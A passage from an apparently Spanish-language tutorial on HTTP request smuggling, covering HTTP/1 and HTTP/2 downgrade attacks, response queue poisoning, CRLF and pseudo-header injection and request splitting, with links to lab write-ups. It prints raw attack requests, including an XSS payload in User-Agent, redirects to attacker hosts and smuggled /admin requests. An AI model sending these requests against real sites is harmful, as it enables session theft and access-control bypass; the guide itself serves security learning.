Una `limitación de esta técnica` es que, por lo general, solo `capturará datos hasta el delimitador de parámetros que corresponda a la solicitud smuggleada`. En los `envíos de formularios codificados mediante URL`, este será el `carácter &`, lo que significa que el `contenido almacenado de la solicitud del usuario víctima terminará en el primer &`, que incluso podría `aparecer en la cadena de consulta`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Exploiting HTTP request smuggling to capture other users' requests - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-9/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-9)

### Utilizar un HTTP request smuggling para explotar un reflected XSS

Si una `aplicación` es `vulnerable a HTTP request smuggling` y además contiene una `vulnerabilidad de reflected XSS`, podemos utilizar un `ataque de HTTP request smuggling` para `afectar a otros usuarios de la aplicación`. Este enfoque es `superior a la explotación normal de reflected XSS` por `dos motivos`:

- `No requiere ninguna interacción con los usuarios víctimas`. No necesitamos `proporcionarles una URL y esperar a que la visiten`. Simplemente `smuggleamos una solicitud que contenga un payload XSS` y la `siguiente solicitud de un usuario que sea procesada por el servidor back-end se verá afectada`

- Puede utilizarse para `explotar un comportamiento de XSS en partes de la solicitud que no pueden controlarse fácilmente en un ataque normal de reflected XSS`, como las `cabeceras de las solicitudes HTTP`

Por ejemplo, supongamos que una `aplicación` tiene una `vulnerabilidad de reflected XSS` en la cabecera `User-Agent`. Podemos explotarla mediante un `ataque de HTTP request smuggling` de la siguiente manera:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

La `siguiente solicitud de un usuario será anexada a la solicitud smuggleada` y ese usuario `recibirá el payload XSS en la respuesta`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Exploiting HTTP request smuggling to deliver reflected XSS - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-10/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-10)

### Utilizar HTTP request smuggling para convertir un on-site redirect en un open redirect

Muchas `aplicaciones` realizan `redirecciones internas de una URL a otra` y colocan el `nombre del host de la cabecera Host de la solicitud en la URL de redirección`. Un ejemplo de esto es el `comportamiento predeterminado de los servidores web Apache e IIS`, donde una `solicitud a una carpeta sin la barra final` recibe una `redirección a la misma carpeta incluyendo la barra final`:

```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

Este comportamiento normalmente se considera `inofensivo`, pero puede explotarse mediante un `ataque de HTTP request smuggling` para `redirigir a otros usuarios hacia un dominio externo`. Por ejemplo:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

La `solicitud smuggleada` provocará una `redirección al sitio web del atacante`, que afectará a la `siguiente solicitud de un usuario que sea procesada por el servidor back-end`. Por ejemplo:

```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

Aquí, la `solicitud del usuario` era para un `archivo JavaScript que era importado por una página del sitio web`. El `atacante` puede `comprometer completamente al usuario víctima devolviendo su propio código JavaScript en la respuesta`

#### Convertir root-relative redirects en open redirects

En algunos casos, podemos encontrarnos con `redirecciones a nivel de servidor que utilizan la ruta para construir una URL relativa a la raíz para la cabecera Location`, por ejemplo:

```
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```

Esto todavía puede utilizarse potencialmente para `realizar un open redirect` si el `servidor nos permite utilizar una protocol-relative URL en el path`:

```
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```

## HTTP/2 request smuggling

En esta sección, mostraremos cómo, al contrario de la `creencia popular`, la `implementación de HTTP/2` ha hecho que muchos `sitios web` sean en realidad `más vulnerables a request smuggling`, incluso si anteriormente eran `seguros frente a este tipo de ataques`

Como `HTTP/2` es un `protocolo binario`, los `mensajes HTTP/2` se han `representado en un formato legible por humanos a lo largo de este material`:

- Cada `mensaje` se muestra como una `única entidad`, en lugar de como `"frames" separados`

- Las `cabeceras` se muestran utilizando `campos de nombre y valor en texto plano`

- Se `anteponen dos puntos a los nombres de las pseudo-cabeceras` para `ayudar a diferenciarlas de las cabeceras normales`

Esto se parece mucho a la forma en que `Burpsuite` representa los `mensajes HTTP/2` en el `Inspector`, pero debemos tener en cuenta que `en realidad no tienen este aspecto cuando se transmiten por la red`

### Longitud de los mensajes en HTTP/2

Un `request smuggling` consiste fundamentalmente en `explotar las discrepancias entre la forma en que diferentes servidores interpretan la longitud de una solicitud`. `HTTP/2` introduce un `único mecanismo robusto para hacerlo`, lo que durante mucho tiempo ha llevado a pensar que es `inherentemente inmune a request smuggling`.

Aunque no lo vemos en `Burpsuite`, los `mensajes HTTP/2` se `envían a través de la red como una serie de frames separados`. Cada `frame` va precedido por un `campo de longitud explícito`, que `indica al servidor exactamente cuántos bytes debe leer`. Por lo tanto, la `longitud de la solicitud` es la `suma de las longitudes de sus frames`

En teoría, este `mecanismo` significa que `no existe ninguna oportunidad para que un atacante introduzca la ambigüedad necesaria para realizar request smuggling`, siempre que el `sitio web` utilice `HTTP/2 de extremo a extremo`. Sin embargo, en la práctica esto suele `no ser así` debido a la `práctica generalizada, pero peligrosa, del HTTP/2 downgrading`

### HTTP/2 downgrading

Como `HTTP/2` sigue siendo relativamente nuevo, los `servidores web que lo admiten` a menudo todavía tienen que `comunicarse con infraestructuras back-end heredadas que solo utilizan HTTP/1`. Como resultado, se ha convertido en una `práctica habitual` que los `servidores front-end` reescriban cada `solicitud HTTP/2 entrante utilizando la sintaxis de HTTP/1`, generando de forma efectiva su `equivalente en HTTP/1`. Esta `solicitud downgradeada` se `reenvía posteriormente al servidor back-end correspondiente`

![](/assets/img/HTTP-Request-Smuggling-Guide/image_3.png)

Cuando el `servidor back-end que utiliza HTTP/1` emite una `respuesta`, el `servidor front-end` invierte este proceso para `generar la respuesta HTTP/2 que devuelve al cliente`

Esto funciona porque cada `versión del protocolo` es, fundamentalmente, una `forma diferente de representar la misma información`. Cada `elemento de un mensaje HTTP/1` tiene un `equivalente aproximado en HTTP/2`

![](/assets/img/HTTP-Request-Smuggling-Guide/image_4.png)

Como resultado, es relativamente sencillo para los `servidores` convertir estas `solicitudes y respuestas entre ambos protocolos`. De hecho, así es como `Burpsuite` puede `mostrar los mensajes HTTP/2 en el editor de mensajes utilizando la sintaxis de HTTP/1`

El `HTTP/2 downgrading` está `extremadamente extendido` e incluso es el `comportamiento predeterminado de varios servicios populares de reverse proxy`. En algunos casos, `ni siquiera existe una opción para desactivarlo`

### ¿Qué riesgos están asociados con HTTP/2 downgrading?

El `HTTP/2 downgrading` puede `exponer a los sitios web a ataques de request smuggling`, aunque `HTTP/2` en sí mismo generalmente se considera `inmune cuando se utiliza de extremo a extremo`

El `mecanismo integrado de longitud de HTTP/2` significa que, cuando se utiliza `HTTP/2 downgrading`, existen potencialmente `tres formas diferentes de especificar la longitud de una misma solicitud`, lo cual constituye la `base de todos los ataques de request smuggling`

### Vulnerabilidades H2.CL

Las `solicitudes HTTP/2` no tienen que `especificar explícitamente su longitud mediante una cabecera`. Durante el `HTTP/2 downgrading`, esto significa que los `servidores front-end` suelen `añadir una cabecera Content-Length de HTTP/1`, derivando su `valor a partir del mecanismo integrado de longitud de HTTP/2`. Curiosamente, las `solicitudes HTTP/2` también pueden `incluir su propia cabecera Content-Length`. En este caso, algunos `servidores front-end` simplemente `reutilizarán este valor en la solicitud HTTP/1 resultante`

La `especificación` establece que `cualquier cabecera Content-Length en una solicitud HTTP/2 debe coincidir con la longitud calculada mediante el mecanismo integrado`, pero esto `no siempre se valida correctamente antes del HTTP/2 downgrading`. Como resultado, puede ser posible `smugglear solicitudes inyectando una cabecera Content-Length engañosa`. Aunque el `servidor front-end` utilizara la `longitud implícita de HTTP/2` para `determinar dónde termina la solicitud`, el `servidor back-end que utiliza HTTP/1` tendrá que `basarse en la cabecera Content-Length derivada de la que inyectamos`, lo que provocará una `desincronización`

Front-end (HTTP/2)

```
:method	POST
:path	/example
:authority	vulnerable-website.com
content-type	application/x-www-form-urlencoded
content-length	0
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

Back-end (HTTP/1)

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

Al realizar algunos `ataques de request smuggling`, queremos que las `cabeceras de la solicitud de la víctima se anexen a la parte inicial de la petición smuggleada`. Sin embargo, en algunos casos estas pueden `interferir con el ataque`, provocando `errores por cabeceras duplicadas` y otros `problemas similares`

En el ejemplo anterior, hemos `mitigado este problema` incluyendo un `parámetro al final` y una cabecera `Content-Length` en la `solicitud smuggleada`. Al utilizar una cabecera `Content-Length` ligeramente mayor que el `cuerpo`, la `solicitud de la víctima` seguirá `anexándose a la parte inicial de la solicitud smuggleada`, pero se `truncará antes de las cabeceras`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- H2.CL request smuggling - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-11/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-11)

### Vulnerabilidades H2.TE

La cabecera `Transfer-Encoding: chunked` es `incompatible con HTTP/2` y la `especificación` recomienda que `cualquier cabecera que intentemos inyectar sea eliminada` o que la `solicitud sea bloqueada por completo`. Si el `servidor front-end` no hacer esto y posteriormente `downgradea la solicitud para un servidor back-end que utiliza HTTP/1` y que sí admite la cabecera `Transfer-Encoding: chunked`, esto también puede `permitir ataques de request smuggling`

Front-end (HTTP/2)

```
:method	POST
:path	/example
:authority	vulnerable-website.com
content-type	application/x-www-form-urlencoded
transfer-encoding	chunked
0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

Back-end (HTTP/1)

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

Si un `sitio web` es `vulnerable a request smuggling H2.CL o H2.TE`, podemos `aprovechar este comportamiento` para `llevar a cabo los mismos ataques que tratamos en nuestros laboratorios anteriores sobre request smuggling`

### Compatibilidad oculta con HTTP/2

Los `navegadores y otros clientes`, incluido `Burpsuite`, normalmente solo utilizan `HTTP/2` para `comunicarse con servidores que anuncian explícitamente su compatibilidad mediante ALPN` como parte del `handshake TLS`

Algunos `servidores` admiten `HTTP/2`, pero `no lo anuncian correctamente debido a una configuración incorrecta`. En estos casos, puede parecer que el `servidor solo admite HTTP/1.1` porque los `clientes recurren a esta versión como opción de respaldo`. Como resultado, podemos `pasar por alto una superficie de ataque viable en HTTP/2` y `no detectar problemas a nivel de protocolo`, como los `ejemplos de request smuggling basado en HTTP/2 downgrading que tratamos anteriormente`

Para forzar al `Repeater de Burpsuite` a utilizar `HTTP/2` y poder `comprobar manualmente esta configuración incorrecta` debemos de hacer lo siguiente:

1. Desde el cuadro de diálogo `Settings`, nos dirigimos a `Tools > Repeater`

2. En `Connections`, habilitamos la opción `Allow HTTP/2 ALPN override`

3. En `Repeater`, vamos al panel `Inspector` y desplegamos la sección `Request attributes`

4. Utilizamos el interruptor para establecer el `Protocol` en `HTTP/2`. `Burpsuite` enviará ahora `todas las solicitudes de esa pestaña utilizando HTTP/2`, independientemente de si el `servidor anuncia compatibilidad con este protocolo`

Si usamos `Burp Suite Professional`, el `escáner de Burpsuite` detecta automáticamente los `casos de compatibilidad oculta con HTTP/2`

## Response queue poisoning

El `Response queue poisoning` es una `potente forma de ataque de HTTP request smuggling` que provoca que un `servidor front-end` empiece a `asociar las respuestas del back-end con las solicitudes equivocadas`. En la práctica, esto significa que `todos los usuarios que comparten la misma conexión entre el front-end y el back-end` reciben de forma persistente `respuestas que estaban destinadas a otra persona`

Esto se consigue `smuggleando una solicitud completa`, lo que hace que el `back-end genere dos respuestas cuando el servidor front-end solo está esperando una`

### ¿Cuál es el impacto del Response queue poisoning?

El impacto del `response queue poisoning` suele ser `catastrófico`. Una vez que la `cola de respuestas ha sido envenenada`, un `atacante` puede `capturar las respuestas de otros usuarios simplemente enviando solicitudes de seguimiento arbitrarias`. Estas respuestas pueden contener `datos personales o empresariales sensibles`, además de `tokens de sesión` y otros elementos similares, lo que en la práctica `concede al atacante acceso completo a la cuenta de la víctima`

El `response queue poisoning` también provoca `importantes daños colaterales`, ya que `rompe el funcionamiento del sitio para cualquier otro usuario cuyo tráfico se envíe al back-end a través de la misma conexión TCP`. Al intentar `navegar por el sitio con normalidad`, los `usuarios recibirán respuestas aparentemente aleatorias del servidor`, lo que `impedirá que la mayoría de las funciones del sitio funcionen correctamente`

### Cómo construir un ataque de Response queue poisoning

Para que un `ataque de response queue poisoning` tenga éxito, deben cumplirse los siguientes `requisitos`:

- La `conexión TCP entre el servidor front-end y el servidor back-end` se `reutiliza para múltiples ciclos de solicitud/respuesta`

- El `atacante` es capaz de `smugglear correctamente una solicitud completa e independiente que recibe su propia respuesta diferenciada del servidor back-end`

- El `ataque no provoca que ninguno de los dos servidores cierre la conexión TCP`. Los `servidores suelen cerrar las conexiones entrantes cuando reciben una solicitud no válida`, ya que `no pueden determinar dónde se supone que termina la solicitud`

### Comprender las consecuencias del HTTP request smuggling

Los `ataques de HTTP request smuggling` suelen consistir en `smugglear una solicitud parcial`, que el `servidor añade como parte inicial al comienzo de la siguiente solicitud en la conexión`. Es importante tener en cuenta que el `contenido de la solicitud smuggleada influye en lo que ocurre con la conexión después del ataque inicial`

Si simplemente `smuggleamos una request line junto con algunas cabeceras`, suponiendo que poco después se `envía otra solicitud a través de la conexión`, el `back-end seguirá viendo finalmente dos solicitudes completas`

![](/assets/img/HTTP-Request-Smuggling-Guide/image_5.png)

Si, en cambio, `smuggleamos una solicitud que también contiene un cuerpo`, la `siguiente solicitud de la conexión se añadirá al cuerpo de la solicitud smuggleada`. Esto suele tener el `efecto secundario de truncar la solicitud final` en función del valor aparente de `Content-Length`. Como resultado, el `back-end` ve, en la práctica, `tres solicitudes`, donde la `tercera solicitud no es más que una serie de bytes sobrantes`:

Front-end (CL)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

Back-end (TE)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

Como estos `bytes sobrantes no forman una solicitud válida`, normalmente esto `provoca un error`, haciendo que el `servidor cierre la conexión`

### Smugglear una solicitud completa

Con un poco de cuidado, podemos `smugglear una solicitud completa en lugar de solo la parte inicial`. Siempre que `enviemos exactamente dos solicitudes en una`, `cualquier solicitud posterior en la conexión permanecerá sin cambios`:

Front-end (CL)

```
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

Back-end (TE)

```
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

Si observamos, vemos que que `ninguna solicitud inválida llega al back-end`, por lo que la `conexión debería permanecer abierta después del ataque`

### Desincronizar la cola de respuestas

Cuando `smuggleamos una solicitud completa`, el `servidor front-end sigue creyendo que solo ha reenviado una única solicitud`. Sin embargo, el `back-end ve dos solicitudes distintas` y, en consecuencia, `enviará dos respuestas`

![](/assets/img/HTTP-Request-Smuggling-Guide/image_6.png)

El `front-end` asocia correctamente la `primera respuesta con la solicitud contenedora inicial` y la `reenvía al cliente`. Como `no hay más solicitudes esperando una respuesta`, la `segunda respuesta`, que es `inesperada`, queda `almacenada en una cola en la conexión entre el front-end y el back-end`

Cuando el `front-end recibe otra solicitud`, la `reenvía al back-end con normalidad`. Sin embargo, al `enviar la respuesta al cliente`, utilizará la `primera respuesta que haya en la cola`, es decir, la `respuesta sobrante correspondiente a la solicitud smuggleada`

La `respuesta correcta del back-end` queda entonces `sin una solicitud correspondiente`. Este `ciclo se repite cada vez que se reenvía una nueva solicitud al back-end a través de la misma conexión`

### Robar las respuestas de otros usuarios

Una vez que la `cola de respuestas ha sido envenenada`, el `atacante` solo tiene que `enviar una solicitud cualquiera para capturar la respuesta de otro usuario`

![](/assets/img/HTTP-Request-Smuggling-Guide/image_7.png)

El `atacante` no tiene control sobre `qué respuestas recibe`, ya que siempre se le enviará la `siguiente respuesta de la cola`, es decir, la `respuesta correspondiente a la solicitud del usuario anterior`. En algunos casos, esto tendrá un `interés limitado`. Sin embargo, utilizando herramientas como el `Intruder de Burpsuite`, un `atacante` puede `automatizar fácilmente el proceso de reenviar la misma solicitud`. De este modo, puede `recopilar rápidamente un conjunto de respuestas destinadas a distintos usuarios`, y es probable que al menos algunas de ellas `contengan información útil`

Un `atacante` puede `seguir robando respuestas de esta forma mientras la conexión entre el front-end y el back-end permanezca abierta`. El `momento exacto en que se cierra una conexión varía según el servidor`, pero una `configuración predeterminada habitual es finalizarla después de haber procesado 100 solicitudes`. Además, resulta `trivial volver a envenenar una nueva conexión una vez que la anterior se ha cerrado`

Para que sea más fácil `diferenciar las respuestas robadas de las respuestas a tus propias solicitudes`, es recomendable probar a `utilizar una ruta inexistente en ambas solicitudes que envíes`. De este modo, tus propias solicitudes deberían recibir siempre una respuesta `404`, por ejemplo

Es importante recalcar que este `ataque` es posible tanto mediante el `clásico HTTP request smuggling en HTTP/1` como `explotando el proceso de downgrade de HTTP/2`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Response queue poisoning via H2.TE request smuggling - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-12/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-12)

## Request smuggling mediante inyección CRLF

Aunque los `sitios web tomen medidas para evitar ataques básicos H2.CL o H2.TE`, como `validar la cabecera content-length` o `eliminar cualquier cabecera transfer-encoding`, el `formato binario de HTTP/2` permite `nuevas formas de eludir este tipo de medidas implementadas en el servidor front-end`

En `HTTP/1`, en ocasiones podemos `explotar discrepancias entre la forma en que los servidores manejan los caracteres de nueva línea independientes (\n)` para `introducir cabeceras prohibidas mediante request smuggling`. Si el `servidor back-end lo interpreta como un delimitador`, pero el `servidor front-end no`, algunos `servidores front-end no detectarán en absoluto la segunda cabecera`

```
Foo: bar\nTransfer-Encoding: chunked
```

Esta `discrepancia no existe con el manejo de una secuencia CRLF (\r\n)` completa, porque `todos los servidores HTTP/1 coinciden en que esta termina la cabecera`

Por otro lado, como los `mensajes HTTP/2 son binarios en lugar de estar basados en texto`, los `límites de cada cabecera se basan en desplazamientos explícitos y predeterminados`, en lugar de `caracteres delimitadores`. Esto significa que `\r\n` deja de tener un `significado especial dentro del valor de una cabecera` y, por tanto, puede `incluirse dentro del propio valor sin provocar que la cabecera se divida`:

```
foo	bar\r\nTransfer-Encoding: chunked
```

Esto puede parecer relativamente `inofensivo por sí solo`, pero cuando se `reescribe como una solicitud HTTP/1`, el `\r\n` volverá a interpretarse como un `delimitador de cabeceras`. Como resultado, un `servidor back-end que utiliza HTTP/1` verá `dos cabeceras distintas`:

```
Foo: bar
Transfer-Encoding: chunked
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- HTTP/2 request smuggling via CRLF injection - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-13/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-13)

## Vectores exclusivos de HTTP/2

Debido a que `HTTP/2` es un `protocolo binario en lugar de uno basado en texto`, existen `varios vectores potenciales que es imposible construir en HTTP/1 debido a las limitaciones de su sintaxis`

Ya hemos visto cómo puedes `inyectar secuencias CRLF en el valor de una cabecera`. En esta sección, veremos otros `vectores exclusivos de HTTP/2 que se pueden utilizar para inyectar payloads`. Aunque este tipo de `solicitudes están oficialmente prohibidas por la especificación de HTTP/2`, algunos `servidores no consiguen validarlas y bloquearlas de forma efectiva`

Solo es posible `realizar estos ataques` utilizando las `funciones especializadas de HTTP/2` en el `panel Inspector de Burpsuite`

### Inyección mediante los nombres de las cabeceras

En `HTTP/1`, `no es posible que el nombre de una cabecera contenga dos puntos (:)` porque este `carácter se utiliza para indicar el final del nombre a los analizadores`. Este `no es el caso en HTTP/2`.

Combinando dos puntos (`:`) con caracteres `\r\n`, es posible que podamos `utilizar el campo del nombre de una cabecera HTTP/2 para introducir de forma encubierta otras cabeceras` y `hacer que pasen los filtros del front-end`. Estas se `interpretarán como cabeceras independientes en el back-end una vez que la solicitud se reescriba utilizando la sintaxis de HTTP/1`:

Front-end (HTTP/2)

```
foo: bar\r\nTransfer-Encoding: chunked\r\nX:	ignore
```

Back-end (HTTP/1)

```
Foo: bar\r\n
Transfer-Encoding: chunked\r\n
X: ignore\r\n
```

### Inyección mediante pseudo-cabeceras

`HTTP/2` no utiliza una `request line ni una status line`. En su lugar, estos `datos se transmiten mediante una serie de pseudo-cabeceras al principio de la solicitud`. En las `representaciones en texto de los mensajes HTTP/2`, normalmente estas van precedidas por dos puntos (`:`) para `ayudar a diferenciarlas de las cabeceras normales`. En total existen `cinco pseudo-cabeceras`:

- `:method` - El `método de la solicitud`

- `:path` - La `ruta de la solicitud`. Debemos de tener en cuenta que `incluye la cadena de consulta`

- `:authority` - Aproximadamente equivalente a la cabecera `Host` de `HTTP/1`

- `:scheme` - El `esquema de la solicitud`, normalmente `http` o `https`

- `:status` - El `código de estado de la respuesta` (no se utiliza en las solicitudes)

Cuando los `sitios web downgradean las solicitudes a HTTP/1`, utilizan los `valores de algunas de estas pseudo-cabeceras para construir dinámicamente la request line`. Esto permite `algunas formas nuevas e interesantes de construir ataques`

### Proporcionar un host ambiguo

Aunque la cabecera `Host` de `HTTP/1` queda sustituida en la práctica por la pseudo-cabecera `:authority` en `HTTP/2`, sigue estando permitido enviar también una cabecera `Host` en la solicitud

En algunos casos, esto puede dar lugar a que aparezcan dos cabeceras `Host` en la `solicitud reescrita a HTTP/1`, lo que `abre otra posibilidad para eludir`, por ejemplo, los filtros del front-end que bloquean solicitudes con cabeceras `Host` duplicadas

Esto puede hacer que el `sitio sea vulnerable a una serie de Host header attacks` frente a los que, de otro modo, `habría sido inmune`

### Proporcionar una ruta ambigua

Intentar `enviar una solicitud con una ruta ambigua` no es posible en `HTTP/1` debido a la `forma en que se analiza la línea de solicitud`. Sin embargo, como la `ruta en HTTP/2 se especifica mediante una pseudo-cabecera`, ahora es posible `enviar una solicitud con dos rutas distintas`. Por ejemplo:

```
:method     POST
:path       /anything
:path       /admin
:authority  vulnerable-website.com
```

Si existe una `discrepancia entre la ruta que validan los controles de acceso del sitio web y la ruta que finalmente se utiliza para enrutar la solicitud`, esto puede permitirnos `acceder a endpoints que, de otro modo, estarían fuera de nuestro alcance`

### Inyectar una request line completa

Durante el `downgrade a HTTP/1`, el valor de la pseudo-cabecera `:method` se escribe al principio de la `solicitud HTTP/1 resultante`. Si el servidor permite incluir espacios en el valor de `:method`, es posible que podamos `inyectar una request line completamente distinta`, por ejemplo:

Front-end (HTTP/2)

```
:method     GET /admin HTTP/1.1
:path       /anything
:authority  vulnerable-website.com
```

Back-end (HTTP/1)

```
GET /admin HTTP/1.1 /anything HTTP/1.1
Host: vulnerable-website.com
```

Siempre que el `servidor también tolere los caracteres arbitrarios que quedan al final de la request line`, esto proporciona `otra forma de crear una solicitud con una ruta ambigua`

### Inyectar un prefijo de URL

Otra `característica interesante de HTTP/2` es la `posibilidad de especificar explícitamente un esquema en la propia solicitud` utilizando la pseudo-cabecera `:scheme`. Aunque normalmente esta solo contendrá `http` o `https`, es posible que podamos `incluir valores arbitrarios`

Esto puede ser útil cuando el servidor utiliza la cabecera `:scheme` para `generar dinámicamente una URL`, por ejemplo. En ese caso, podríamos `añadir un prefijo a la URL` o incluso `sobrescribirla por completo desplazando la URL real a la cadena de consulta`. Por ejemplo:

Solicitud

```
:method     GET
:path       /anything
:authority  vulnerable-website.com
:scheme     https://evil-user.net/poison?
```

Respuesta

```
:status     301
location    https://evil-user.net/poison?://vulnerable-website.com/anything/
```

### Inyectar saltos de línea en pseudo-cabeceras

Cuando inyectamos en las pseudo-cabeceras `:path` o `:method`, debemos asegurarnos de que la `solicitud HTTP/1 resultante siga teniendo una request line válida`

Como `\r\n` termina la `línea de solicitud en HTTP/1`, añadir simplemente `\r\n` en mitad de ella solo provocará que la `solicitud quede mal formada`. Tras el `downgrade`, la solicitud reescrita debe contener la `siguiente secuencia` antes del primer `\r\n` que inyectemos:

```
<método> + espacio + <ruta> + espacio + HTTP/1.1
```

Solo tenemos que `visualizar en qué punto de esta secuencia cae nuestra inyección` e `incluir todas las partes restantes según corresponda`. Por ejemplo, al inyectar en `:path`, debemos añadir un espacio y `HTTP/1.1` antes del `\r\n`, de la siguiente forma:

Front-end (HTTP/2)

```
:method      GET
:path
/example HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
X: x

:authority   vulnerable-website.com
```

Back-end (HTTP/1)

```
GET /example HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
X: x HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

En este caso, también hemos `añadido una cabecera arbitraria al final (X: x)` para `absorber el espacio y el protocolo (HTTP/1.1)` que se `añadieron automáticamente durante la reescritura`

## HTTP/2 request splitting

Cuando vimos `response queue poisoning`, aprendimos cómo `dividir una única solicitud HTTP en exactamente dos solicitudes completas en el back-end`. En el ejemplo que vimos, la `división se producía dentro del cuerpo del mensaje`, pero cuando entra en juego el `downgrade de HTTP/2 a HTTP/1`, también podemos  hacer que esta `división se produzca en las cabeceras`

Este enfoque es `más versátil` porque `no dependemos de utilizar métodos de solicitud a los que se les permite contener un body`. Por ejemplo, incluso podemos utilizar una solicitud `GET`:

```
:method      GET
:path        /
:authority   vulnerable-website.com
foo
bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

Esto también resulta útil en los casos en los que se valida el `Content-Length` y el `back-end no admite chunked encoding`

### Tener en cuenta la reescritura del front-end

Para `dividir una solicitud en las cabeceras`, necesitamos `comprender cómo el servidor front-end reescribe la solicitud` y `tener esto en cuenta al añadir manualmente cualquier cabecera HTTP/1`. De lo contrario, una de las `solicitudes podría carecer de cabeceras obligatorias`

Por ejemplo, debemos asegurarnos de que ambas solicitudes que recibe el back-end contienen una cabecera `Host`. Los `servidores front-end` normalmente eliminan la pseudo-cabecera `:authority` y la sustituyen por una nueva cabecera `Host` de `HTTP/1` durante el `downgrade`. Existen `diferentes formas de hacerlo`, lo que puede influir en el lugar donde debemos colocar la cabecera `Host` que estamos inyectando

Considera la siguiente `solicitud`:

```
:method      GET
:path        /
:authority   vulnerable-website.com
foo
bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

Durante la reescritura, algunos `servidores front-end` añaden la nueva cabecera `Host` al final de la lista actual de cabeceras. Desde la perspectiva de un `front-end HTTP/2`, esto ocurre después de la cabecera `foo`. Esto también `sucede después del punto en el que la solicitud se dividirá en el back-end`

Como resultado, la primera solicitud no tendría ninguna cabecera `Host`, mientras que la `solicitud smuggleada tendría dos`. En este caso, debemos colocar la cabecera `Host` que inyectamos de forma que `termine formando parte de la primera solicitud una vez que se produzca la división`:

```
:method      GET
:path        /
:authority   vulnerable-website.com
foo
bar\r\n
Host: vulnerable-website.com\r\n
\r\n
GET /admin HTTP/1.1
```

También tendremos que `ajustar de la misma forma la posición de cualquier cabecera interna que queramos inyectar`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- HTTP/2 request splitting via CRLF injection - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-14/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-14)

En el ejemplo anterior, hemos `dividido la solicitud de forma que desencadena un response queue poisoning`, pero también podemos `smugglear el inicio de una solicitud para realizar ataques clásicos de request smuggling utilizando esta misma técnica`

En este caso, las `cabeceras que inyectemos pueden entrar en conflicto con las cabeceras de la solicitud que el back-end anexará al inicio de la solicitud smuggleada`, lo que puede `provocar errores por cabeceras duplicadas` o `hacer que la solicitud termine en un lugar incorrecto`

Para `mitigar este problema`, podemos incluir un `parámetro del body al final de la solicitud smuggleada` junto con una cabecera `Content-Length` cuyo valor sea `ligeramente mayor que el tamaño real del cuerpo`. La `solicitud de la víctima` seguirá `anexándose al inicio de la solicitud smuggleada`, pero quedará `truncada antes de llegar a las cabeceras`.

## Request smuggling mediante el navegador

